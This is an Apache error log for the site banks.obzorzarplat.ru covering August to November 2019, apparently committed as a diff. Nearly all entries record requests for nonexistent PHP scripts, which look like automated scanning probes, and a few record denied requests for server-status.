+[Sat Aug 10 13:27:51.778805 2019] [php7:error] [pid 4285] [client 218.95.167.142:53676] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Aug 10 17:20:49.301368 2019] [php7:error] [pid 4223] [client 5.188.210.101:15195] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sun Aug 11 07:45:57.967391 2019] [authz_core:error] [pid 11157] [client 27.115.124.6:65357] AH01630: client denied by server configuration: /var/www/banks.obzorzarplat.ru/docs/public/server-status, referer: http://www.baidu.com
+[Mon Aug 12 17:34:01.952193 2019] [php7:error] [pid 20559] [client 144.34.193.58:46332] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Aug 13 04:34:36.920136 2019] [php7:error] [pid 16879] [client 77.247.110.186:41290] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Tue Aug 13 05:12:59.753225 2019] [php7:error] [pid 16880] [client 127.0.0.1:47942] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Tue Aug 13 07:37:48.880576 2019] [php7:error] [pid 24765] [client 83.217.8.122:43864] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Fri Aug 16 10:16:30.454042 2019] [php7:error] [pid 318] [client 127.0.0.1:47112] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Fri Aug 16 10:27:27.215162 2019] [php7:error] [pid 316] [client 127.0.0.1:47512] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Sat Aug 17 23:08:11.966927 2019] [php7:error] [pid 20219] [client 5.188.210.101:17419] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sun Aug 18 15:34:57.005742 2019] [php7:error] [pid 6135] [client 127.0.0.1:45638] script '/var/www/banks.obzorzarplat.ru/docs/public/update.php' not found or unable to stat
+[Sun Aug 18 15:58:10.287465 2019] [php7:error] [pid 6136] [client 5.165.123.150:58371] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Mon Aug 19 13:08:31.093320 2019] [php7:error] [pid 28253] [client 45.40.204.173:47950] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Aug 19 21:08:18.539974 2019] [php7:error] [pid 23661] [client 111.231.169.160:40250] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Aug 21 05:58:31.074409 2019] [php7:error] [pid 7744] [client 103.74.248.103:53768] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Aug 22 23:58:19.822548 2019] [php7:error] [pid 16970] [client 127.0.0.1:37974] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Fri Aug 23 00:11:16.322913 2019] [php7:error] [pid 16970] [client 127.0.0.1:38116] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Sun Aug 25 04:24:05.736414 2019] [php7:error] [pid 10519] [client 5.188.210.101:37518] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sun Aug 25 21:41:43.755008 2019] [php7:error] [pid 30838] [client 103.85.109.44:55388] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Aug 26 18:35:34.014933 2019] [php7:error] [pid 17453] [client 103.74.248.103:36634] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Aug 28 11:54:01.094864 2019] [php7:error] [pid 7408] [client 103.23.42.207:37463] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Aug 28 21:42:05.548393 2019] [php7:error] [pid 5388] [client 106.52.184.179:58530] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Aug 29 17:50:45.568150 2019] [php7:error] [pid 17480] [client 185.53.88.54:32928] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Thu Aug 29 18:02:18.726702 2019] [php7:error] [pid 23002] [client 127.0.0.1:56522] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Fri Aug 30 15:39:17.313288 2019] [php7:error] [pid 5609] [client 127.0.0.1:43462] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Sat Aug 31 10:27:00.469142 2019] [php7:error] [pid 23245] [client 49.235.205.34:48900] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Aug 31 18:42:15.326245 2019] [php7:error] [pid 25247] [client 39.135.1.158:47018] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Sep 01 00:02:54.036776 2019] [php7:error] [pid 23345] [client 5.188.210.101:14579] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Tue Sep 03 00:57:42.470119 2019] [php7:error] [pid 19604] [client 83.217.8.122:45036] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Tue Sep 03 19:24:13.962322 2019] [php7:error] [pid 11180] [client 13.235.70.240:57308] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Sep 05 01:03:19.249525 2019] [php7:error] [pid 20237] [client 47.104.233.87:33288] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Sep 06 05:12:37.349945 2019] [php7:error] [pid 2628] [client 127.0.0.1:36934] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Fri Sep 06 05:40:26.423060 2019] [php7:error] [pid 2437] [client 185.53.88.54:41864] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Fri Sep 06 12:54:02.633040 2019] [php7:error] [pid 32517] [client 110.80.137.63:42288] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Sep 07 11:33:56.786253 2019] [php7:error] [pid 10246] [client 5.188.210.101:62924] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sat Sep 07 22:43:50.433816 2019] [php7:error] [pid 20662] [client 106.13.59.126:42676] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Sep 08 21:22:53.891293 2019] [php7:error] [pid 25142] [client 149.129.50.37:48471] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Mon Sep 09 03:01:45.630658 2019] [php7:error] [pid 3106] [client 101.89.197.199:44967] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Sep 09 18:03:31.473127 2019] [php7:error] [pid 5687] [client 27.124.43.69:45122] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Sep 09 19:22:26.149798 2019] [php7:error] [pid 5083] [client 127.0.0.1:44872] script '/var/www/banks.obzorzarplat.ru/docs/public/admin.php' not found or unable to stat
+[Mon Sep 09 21:33:00.441603 2019] [php7:error] [pid 5687] [client 59.37.137.92:52806] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Sep 10 09:05:38.856508 2019] [php7:error] [pid 21022] [client 83.217.8.122:59319] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Wed Sep 11 00:17:33.244912 2019] [php7:error] [pid 21017] [client 83.143.86.62:37966] script '/var/www/banks.obzorzarplat.ru/docs/public/admin.php' not found or unable to stat
+[Wed Sep 11 23:40:22.947041 2019] [php7:error] [pid 17595] [client 51.83.234.52:40012] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Sep 12 06:55:57.972302 2019] [php7:error] [pid 31504] [client 182.254.147.20:59896] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Sep 13 13:31:59.245615 2019] [php7:error] [pid 12005] [client 180.153.184.9:47748] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Sep 14 15:11:14.800820 2019] [php7:error] [pid 26551] [client 193.112.104.19:40470] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Sep 14 21:37:51.297522 2019] [php7:error] [pid 26551] [client 144.34.193.58:32942] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Sep 14 22:09:53.455663 2019] [php7:error] [pid 26739] [client 5.188.210.101:11899] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Mon Sep 16 11:13:07.399529 2019] [php7:error] [pid 24845] [client 103.219.34.72:50214] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Sep 17 15:54:11.666040 2019] [php7:error] [pid 17111] [client 49.234.3.177:55456] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Sep 18 02:07:12.517817 2019] [php7:error] [pid 10788] [client 175.184.121.219:36339] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Sep 19 08:33:18.778574 2019] [php7:error] [pid 14088] [client 18.138.82.247:46848] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Sep 19 23:02:07.958476 2019] [php7:error] [pid 14089] [client 220.202.12.48:36376] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Sep 19 23:08:19.591930 2019] [php7:error] [pid 12976] [client 180.96.14.25:37386] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Sep 20 07:44:55.056550 2019] [php7:error] [pid 3913] [client 220.202.12.71:33834] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Sep 21 13:05:42.342318 2019] [php7:error] [pid 23339] [client 27.124.43.69:55426] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Sep 21 17:11:21.962369 2019] [core:error] [pid 18700] [client 127.0.0.1:46742] AH00135: Invalid method in request RPC_IN_DATA /rpc/rpcproxy.dll?localhost:3388 HTTP/1.0
+[Sat Sep 21 17:15:51.466143 2019] [php7:error] [pid 23339] [client 120.92.123.150:6280] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Sep 21 17:50:11.490031 2019] [php7:error] [pid 18703] [client 120.92.123.150:32784] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Sep 22 08:59:28.905599 2019] [php7:error] [pid 2399] [client 176.58.124.134:50182] script '/var/www/banks.obzorzarplat.ru/docs/public/whoami.php' not found or unable to stat
+[Sun Sep 22 14:40:29.491307 2019] [php7:error] [pid 2400] [client 127.0.0.1:55872] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Mon Sep 23 02:18:22.723583 2019] [php7:error] [pid 19173] [client 140.143.16.158:49257] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Sep 23 14:07:39.461510 2019] [php7:error] [pid 21895] [client 127.0.0.1:40624] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Mon Sep 23 14:11:17.647291 2019] [php7:error] [pid 21895] [client 127.0.0.1:40704] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Wed Sep 25 16:51:54.831648 2019] [php7:error] [pid 24482] [client 180.96.14.25:54172] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Sep 28 00:51:41.658964 2019] [php7:error] [pid 20069] [client 123.206.176.235:36526] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Sep 28 10:47:16.117726 2019] [php7:error] [pid 4396] [client 49.233.5.191:45516] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Sep 28 12:12:35.453561 2019] [php7:error] [pid 1978] [client 217.106.238.30:39068] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sat Sep 28 19:09:25.897820 2019] [php7:error] [pid 4397] [client 176.58.124.134:41658] script '/var/www/banks.obzorzarplat.ru/docs/public/whoami.php' not found or unable to stat
+[Sun Sep 29 09:55:25.331859 2019] [php7:error] [pid 18542] [client 172.105.23.36:56116] script '/var/www/banks.obzorzarplat.ru/docs/public/whoami.php' not found or unable to stat
+[Mon Sep 30 23:02:53.430359 2019] [php7:error] [pid 6430] [client 5.188.210.101:16843] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Tue Oct 01 04:40:30.071482 2019] [php7:error] [pid 25728] [client 119.28.223.57:37480] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Oct 02 12:37:18.225014 2019] [php7:error] [pid 21437] [client 222.186.130.20:46072] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Oct 02 21:32:07.311434 2019] [php7:error] [pid 21439] [client 127.0.0.1:49240] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Fri Oct 04 12:08:45.356104 2019] [php7:error] [pid 22970] [client 222.186.130.42:46802] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Oct 05 11:10:11.581337 2019] [php7:error] [pid 11837] [client 120.204.202.112:30357] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Oct 06 06:33:04.071518 2019] [php7:error] [pid 26745] [client 129.211.74.11:49454] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Oct 06 20:36:23.815219 2019] [php7:error] [pid 26525] [client 176.122.128.92:38940] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Oct 07 15:36:18.832293 2019] [php7:error] [pid 19086] [client 138.91.122.226:49090] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Oct 07 18:01:48.361915 2019] [php7:error] [pid 12871] [client 83.217.8.122:36616] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Mon Oct 07 21:52:05.707905 2019] [php7:error] [pid 12870] [client 5.188.210.101:41752] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Thu Oct 10 22:01:05.119441 2019] [php7:error] [pid 29537] [client 127.0.0.1:54756] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Thu Oct 10 22:16:15.188429 2019] [php7:error] [pid 29353] [client 127.0.0.1:54848] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Sun Oct 13 10:07:06.767662 2019] [php7:error] [pid 9703] [client 222.186.130.42:46547] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Oct 13 22:50:11.924285 2019] [php7:error] [pid 8475] [client 114.215.184.51:49796] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Oct 14 14:21:33.397602 2019] [php7:error] [pid 16092] [client 122.115.224.143:41186] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Oct 14 21:09:14.116178 2019] [php7:error] [pid 16093] [client 222.175.244.242:58646] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Oct 14 23:50:32.474597 2019] [php7:error] [pid 16093] [client 5.188.210.101:39154] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Wed Oct 16 11:05:06.177248 2019] [php7:error] [pid 32214] [client 149.129.50.37:56822] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Thu Oct 17 00:20:39.832669 2019] [php7:error] [pid 32219] [client 47.101.154.70:38102] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Oct 17 23:24:09.398014 2019] [php7:error] [pid 7435] [client 127.0.0.1:39614] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Thu Oct 17 23:36:54.877194 2019] [php7:error] [pid 7721] [client 127.0.0.1:39714] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Sat Oct 19 04:10:49.140279 2019] [php7:error] [pid 23030] [client 223.223.179.11:46416] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Oct 19 06:39:16.783370 2019] [php7:error] [pid 643] [client 192.144.233.198:47758] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Oct 20 02:43:26.760548 2019] [php7:error] [pid 1182] [client 51.83.234.52:52958] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Oct 21 13:27:58.641191 2019] [php7:error] [pid 626] [client 193.109.128.48:57555] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Mon Oct 21 13:32:54.330029 2019] [php7:error] [pid 626] [client 193.109.128.48:52943] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Mon Oct 21 13:44:14.623047 2019] [php7:error] [pid 624] [client 217.106.238.30:34403] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Mon Oct 21 23:00:54.998751 2019] [php7:error] [pid 622] [client 5.188.210.101:27429] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Tue Oct 22 05:32:05.654045 2019] [php7:error] [pid 625] [client 121.196.192.116:51332] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Oct 22 12:06:06.845143 2019] [php7:error] [pid 16663] [client 49.234.43.58:52940] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Oct 24 07:21:46.276233 2019] [php7:error] [pid 17626] [client 112.29.140.229:51336] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Oct 25 00:13:54.756322 2019] [php7:error] [pid 16839] [client 149.129.50.37:39942] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Sat Oct 26 00:11:22.822837 2019] [php7:error] [pid 30725] [client 127.0.0.1:47348] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Sun Oct 27 14:49:58.325853 2019] [php7:error] [pid 26208] [client 127.0.0.1:41342] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Sun Oct 27 15:25:42.664960 2019] [php7:error] [pid 26141] [client 185.53.88.92:53738] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Mon Oct 28 07:31:17.587151 2019] [php7:error] [pid 8471] [client 172.105.23.36:32952] script '/var/www/banks.obzorzarplat.ru/docs/public/whoami.php' not found or unable to stat
+[Tue Oct 29 14:44:41.537184 2019] [php7:error] [pid 27415] [client 5.188.210.101:17109] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Wed Oct 30 03:37:49.662696 2019] [php7:error] [pid 27416] [client 127.0.0.1:49562] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat
+[Wed Oct 30 15:45:06.419703 2019] [php7:error] [pid 24310] [client 94.155.72.172:2451] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Thu Oct 31 01:35:41.227736 2019] [php7:error] [pid 10299] [client 114.215.254.34:35906] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Oct 31 06:51:07.313165 2019] [php7:error] [pid 12569] [client 217.106.238.30:52863] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Thu Oct 31 11:33:12.793875 2019] [php7:error] [pid 12571] [client 185.53.88.92:39032] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Thu Oct 31 11:46:37.037542 2019] [php7:error] [pid 12570] [client 127.0.0.1:50756] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Thu Oct 31 20:09:19.583274 2019] [php7:error] [pid 20974] [client 134.175.143.12:60246] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Nov 01 08:04:36.097396 2019] [php7:error] [pid 27311] [client 47.95.199.242:56844] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Nov 02 12:21:04.649913 2019] [php7:error] [pid 6205] [client 106.54.138.167:60874] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Nov 03 03:16:36.351377 2019] [php7:error] [pid 4520] [client 140.143.16.158:51503] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Nov 04 09:07:24.172877 2019] [php7:error] [pid 1780] [client 193.112.56.84:59810] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Nov 05 05:56:34.528692 2019] [php7:error] [pid 1781] [client 127.0.0.1:37870] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Tue Nov 05 12:01:58.773770 2019] [php7:error] [pid 13606] [client 5.188.210.101:53804] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Tue Nov 05 13:42:23.217095 2019] [php7:error] [pid 13143] [client 127.0.0.1:48298] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://www.google.com.hk
+[Tue Nov 05 13:43:15.858089 2019] [php7:error] [pid 13145] [client 127.0.0.1:48306] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat, referer: http://www.google.com.hk
+[Wed Nov 06 14:11:40.165708 2019] [php7:error] [pid 26673] [client 127.0.0.1:40940] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Wed Nov 06 18:05:07.751580 2019] [php7:error] [pid 1250] [client 27.124.43.69:49934] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Nov 07 01:12:41.540830 2019] [php7:error] [pid 1250] [client 149.129.50.37:57062] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Thu Nov 07 10:58:04.537537 2019] [php7:error] [pid 10794] [client 148.70.5.119:43256] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Nov 07 12:21:27.543744 2019] [php7:error] [pid 10795] [client 51.83.234.51:51690] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Nov 07 16:56:07.477807 2019] [php7:error] [pid 10871] [client 148.70.78.165:33260] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Nov 08 00:15:02.756103 2019] [php7:error] [pid 12829] [client 41.205.14.248:52738] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Fri Nov 08 07:36:36.067104 2019] [php7:error] [pid 25630] [client 118.89.201.242:41936] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Nov 08 10:16:49.284009 2019] [php7:error] [pid 25663] [client 211.155.91.170:36202] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Nov 08 17:31:02.749187 2019] [php7:error] [pid 25663] [client 216.83.58.217:56916] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Nov 09 09:21:16.499649 2019] [php7:error] [pid 9243] [client 41.205.14.152:59717] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Sat Nov 09 17:20:32.056138 2019] [php7:error] [pid 9245] [client 178.17.171.199:40645] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sat Nov 09 23:37:52.429756 2019] [php7:error] [pid 18281] [client 222.186.130.42:41484] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Nov 10 08:53:09.333023 2019] [php7:error] [pid 25049] [client 176.53.87.123:51084] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Nov 10 12:14:30.355300 2019] [php7:error] [pid 23867] [client 112.196.9.213:60981] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Nov 11 09:16:45.200877 2019] [php7:error] [pid 8562] [client 106.75.109.223:38478] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Nov 11 21:23:57.842717 2019] [php7:error] [pid 6651] [client 5.188.210.101:22794] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Mon Nov 11 21:35:13.654646 2019] [php7:error] [pid 8562] [client 111.231.105.111:57042] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Nov 12 19:43:01.414988 2019] [php7:error] [pid 22839] [client 140.143.171.159:41602] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Nov 14 11:23:27.908975 2019] [php7:error] [pid 9472] [client 217.106.238.30:42900] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Fri Nov 15 18:06:19.396254 2019] [php7:error] [pid 26072] [client 188.163.37.66:25535] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Sat Nov 16 02:04:43.065493 2019] [php7:error] [pid 26073] [client 186.155.214.168:54743] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Nov 17 16:41:29.419696 2019] [php7:error] [pid 18702] [client 47.103.212.153:53378] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Nov 18 03:29:22.043027 2019] [php7:error] [pid 18706] [client 217.106.238.30:35831] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Tue Nov 19 18:25:50.110650 2019] [php7:error] [pid 11768] [client 5.188.210.101:58294] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Wed Nov 20 12:30:33.115615 2019] [php7:error] [pid 25831] [client 176.126.62.87:65425] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Wed Nov 20 14:42:17.030207 2019] [php7:error] [pid 23796] [client 130.61.63.30:41360] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Nov 20 20:21:52.838883 2019] [php7:error] [pid 23791] [client 39.99.132.122:32846] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Nov 20 23:30:22.469921 2019] [php7:error] [pid 26873] [client 176.126.62.87:59638] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Thu Nov 21 09:37:26.753196 2019] [php7:error] [pid 32686] [client 49.234.10.232:54654] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Nov 22 04:51:08.771106 2019] [php7:error] [pid 1423] [client 31.135.149.156:63859] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Sat Nov 23 09:37:21.691898 2019] [php7:error] [pid 31858] [client 51.83.234.53:55914] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Nov 23 09:41:10.303688 2019] [php7:error] [pid 30091] [client 47.105.166.211:53910] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Nov 23 14:25:02.787683 2019] [php7:error] [pid 30092] [client 60.206.137.154:35259] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Nov 24 11:03:11.784397 2019] [authz_core:error] [pid 9004] [client 54.74.226.240:43834] AH01630: client denied by server configuration: /var/www/banks.obzorzarplat.ru/docs/public/server-status
+[Mon Nov 25 05:46:30.528707 2019] [php7:error] [pid 18764] [client 106.53.15.178:38204] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
